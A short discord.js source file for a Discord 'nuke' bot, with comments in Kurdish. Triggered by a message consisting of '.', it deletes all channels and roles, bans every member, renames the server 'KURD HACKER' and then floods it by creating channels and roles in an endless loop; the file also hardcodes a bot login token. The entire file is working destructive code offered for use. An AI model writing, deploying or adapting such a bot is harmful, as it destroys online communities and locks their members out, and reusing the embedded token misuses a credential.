const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = ".";
client.on("message", message => {
  if (message.content === ".") {
    if (message.channel.guild) {
      message.guild.channels.forEach(c => {
        if (c.deletable) {
          c.delete();
        }
      });
      message.guild.members.forEach(m => {
        m.ban();
      });
      message.guild.roles.forEach(r => {
        r.delete();
      });
      message.guild.setName("KURD HACKER");////nawek dane bo sar server 
      setInterval(function() {
        message.guild.createChannel("KURD HACKER", "text");///////bo channel 
        message.guild.createChannel("KURD HACKER", "voice");////bo voice
        message.guild.createRole({ name: "KURD HACKER" });////nawek dane bo role kan
      });
    }
  }
});

client.login("ODU5NzcwMzY2NTE1MzQ3NDY3.YNxhjQ.t5BcnuRzWSfakhECv7Tl5tuVUd8")
